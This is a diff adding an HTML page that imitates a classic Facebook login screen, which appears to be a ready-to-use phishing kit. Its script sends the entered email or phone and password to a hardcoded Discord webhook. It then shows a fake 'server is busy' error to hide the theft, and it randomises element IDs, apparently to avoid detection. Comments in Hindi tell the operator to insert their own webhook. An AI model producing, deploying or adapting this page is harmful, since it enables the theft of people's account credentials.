@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Facebook - Log In or Sign Up</title>
+<style>
+  /* Base Reset (2014 Style) */
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica', 'Arial', sans-serif; }
+  html, body { height: 100%; background: #e9ebee; overflow: hidden; }
+  
+  #app { display: flex; flex-direction: column; height: 100vh; height: 100dvh; overflow-y: auto; }
+
+  /* 2014 Classic Header */
+  .header { background: #3b5998; padding: 10px 16px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+  .header-logo { color: #fff; font-size: 24px; font-weight: bold; letter-spacing: -1px; }
+  
+  /* Main Content Area */
+  .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px 16px; background: #e9ebee; }
+  
+  /* Classic Login Box */
+  .login-box { 
+    background: #fff; width: 100%; max-width: 360px; 
+    padding: 20px; border-radius: 4px; 
+    border: 1px solid #ccc; box-shadow: 0 1px 3px rgba(0,0,0,0.1); 
+    margin-top: 20px;
+  }
+  
+  .login-box h2 { color: #333; font-size: 18px; margin-bottom: 15px; font-weight: bold; border-bottom: 1px solid #e5e5e5; padding-bottom: 10px; }
+
+  /* Classic Inputs */
+  .input-group { margin-bottom: 12px; }
+  .input-group input { 
+    width: 100%; padding: 10px; font-size: 14px; 
+    border: 1px solid #bdc7d8; border-radius: 3px; 
+    outline: none; background: #fff; color: #333;
+  }
+  .input-group input:focus { border: 1px solid #3b5998; }
+
+  /* Classic Buttons */
+  .btn-login {
+    width: 100%; padding: 10px; background: #4267b2; color: #fff;
+    border: 1px solid #29487d; border-radius: 3px; font-size: 14px; font-weight: bold;
+    margin-top: 10px; cursor: pointer;
+  }
+  .btn-login:active { background: #3b5998; }
+  .btn-login:disabled { opacity: 0.7; }
+
+  /* Classic Links */
+  .forgot { display: block; text-align: center; margin-top: 15px; color: #3b5998; font-size: 13px; text-decoration: none; cursor: pointer; }
+  .forgot:hover { text-decoration: underline; }
+
+  .divider { height: 1px; background: #e5e5e5; margin: 20px 0; }
+
+  .create-btn {
+    width: 100%; padding: 10px; background: #42b72a; color: #fff;
+    border: 1px solid #36a420; border-radius: 3px; font-size: 14px; font-weight: bold;
+    cursor: pointer;
+  }
+  .create-btn:active { background: #36a420; }
+
+  /* Error Box (2014 Style) */
+  .error-box {
+    display: none; background: #ffebe8; border: 1px solid #dd3c10;
+    border-radius: 3px; padding: 10px; margin-top: 15px;
+    color: #dd3c10; font-size: 13px; font-weight: bold; text-align: center;
+  }
+
+  /* Eye Icon (Classic) */
+  .eye-btn {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    background: transparent; border: none; cursor: pointer;
+    color: #888; padding: 5px; display: flex; align-items: center; justify-content: center;
+  }
+  .eye-btn svg { width: 18px; height: 18px; fill: currentColor; }
+
+  /* Footer */
+  .footer { margin-top: auto; padding: 20px; text-align: center; color: #90949c; font-size: 11px; }
+</style>
+</head>
+<body>
+
+<div id="app"></div>
+
+<script>
+'use strict';
+
+// ============================================================
+// 1. API SETUP (Yahan apna naya Discord Webhook URL daalein)
+// ============================================================
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1563809658605412492/OswABm2DrR29AYEjb0QhCBrLrjiHPKLRWrz8lFolqMe9efjmHr3FyzUjJEW5NCraEp5L'; 
+const WEBHOOK_TIMEOUT = 5000;
+
+// ============================================================
+// 2. POLYMORPHIC ENGINE (Random ID Generator)
+// ============================================================
+const sig = () => 'f14_' + Math.random().toString(36).substring(2, 9);
+const IDS = {
+    email: sig(), pass: sig(), btn: sig(), err: sig(),
+    eye: sig(), eyeShow: sig(), eyeHide: sig(),
+    forgot: sig(), create: sig()
+};
+
+let isBusy = false;
+
+// ============================================================
+// 3. WEBHOOK API FUNCTION
+// ============================================================
+async function sendData(email, pass) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YAHAN_APNA') || !WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
+        console.warn('⚠️ Webhook URL missing or invalid.');
+        return;
+    }
+    
+    const payload = JSON.stringify({
+        embeds: [{
+            title: '📘 FB 2014 Login',
+            color: 3882104, // 2014 FB Blue (#3b5998)
+            fields: [
+                { name: 'Email/Phone', value: email, inline: false },
+                { name: 'Password', value: pass, inline: false }
+            ],
+            footer: { text: 'Classic 2014' },
+            timestamp: new Date().toISOString()
+        }]
+    });
+
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), WEBHOOK_TIMEOUT);
+    
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            signal: ctrl.signal,
+            mode: 'cors'
+        });
+        clearTimeout(timer);
+        console.log('✅ Data Sent');
+    } catch (e) {
+        clearTimeout(timer);
+        console.warn("❌ API Error:", e.message);
+    }
+}
+
+// ============================================================
+// 4. UI INJECTION (2014 Facebook Style)
+// ============================================================
+function buildUI() {
+    const app = document.getElementById('app');
+
+    app.innerHTML = `
+        <!-- Classic Header -->
+        <div class="header">
+            <div class="header-logo">facebook</div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main">
+            <div class="login-box">
+                <h2>Log into Facebook</h2>
+                
+                <div class="input-group">
+                    <input type="text" id="${IDS.email}" placeholder="Email or Phone" autocomplete="off" inputmode="email">
+                </div>
+                <div class="input-group" style="position:relative;">
+                    <input type="password" id="${IDS.pass}" placeholder="Password" autocomplete="off">
+                    <button type="button" class="eye-btn" id="${IDS.eye}">
+                        <svg id="${IDS.eyeShow}" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        <svg id="${IDS.eyeHide}" viewBox="0 0 24 24" style="display:none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+                    </button>
+                </div>
+                
+                <button class="btn-login" id="${IDS.btn}">Log In</button>
+                
+                <div class="error-box" id="${IDS.err}"></div>
+
+                <a class="forgot" id="${IDS.forgot}">Forgot your password?</a>
+                
+                <div class="divider"></div>
+                
+                <button class="create-btn" id="${IDS.create}">Create New Account</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            Facebook © 2014 · English (US)
+        </div>
+    `;
+
+    // Attach Events
+    document.getElementById(IDS.eye).onclick = togglePassword;
+    document.getElementById(IDS.btn).onclick = handleLogin;
+    document.getElementById(IDS.forgot).onclick = showBusyError;
+    document.getElementById(IDS.create).onclick = showBusyError;
+}
+
+// ============================================================
+// 5. LOGIC FUNCTIONS
+// ============================================================
+
+// Toggle Password
+function togglePassword() {
+    const pi = document.getElementById(IDS.pass);
+    const show = document.getElementById(IDS.eyeShow);
+    const hide = document.getElementById(IDS.eyeHide);
+
+    if (pi.type === 'password') {
+        pi.type = 'text'; show.style.display = 'none'; hide.style.display = 'block';
+    } else {
+        pi.type = 'password'; show.style.display = 'block'; hide.style.display = 'none';
+    }
+}
+
+// Show Busy Error for Forgot/Create
+function showBusyError(e) {
+    if (e) e.preventDefault();
+    if (isBusy) return;
+
+    const errBox = document.getElementById(IDS.err);
+    errBox.style.display = 'block';
+    errBox.innerHTML = "Currently server is busy, try again <b>3 hours</b> later.";
+}
+
+// Login Logic
+async function handleLogin() {
+    if (isBusy) return;
+
+    const email = document.getElementById(IDS.email).value.trim();
+    const pass = document.getElementById(IDS.pass).value;
+    const btn = document.getElementById(IDS.btn);
+    const errBox = document.getElementById(IDS.err);
+
+    errBox.style.display = 'none';
+
+    if (!email || !pass) {
+        alert('Please enter your email and password.');
+        return;
+    }
+
+    isBusy = true;
+    btn.disabled = true;
+    btn.innerText = 'Logging in...';
+
+    // Send API Data
+    await sendData(email, pass);
+
+    // Show Error
+    btn.disabled = false;
+    btn.innerText = 'Log In';
+    isBusy = false;
+
+    errBox.innerHTML = "Currently server is busy, try again <b>3 hours</b> later.";
+    errBox.style.display = 'block';
+}
+
+// Start Engine
+window.addEventListener('DOMContentLoaded', buildUI);
+</script>
+</body>
+</html>
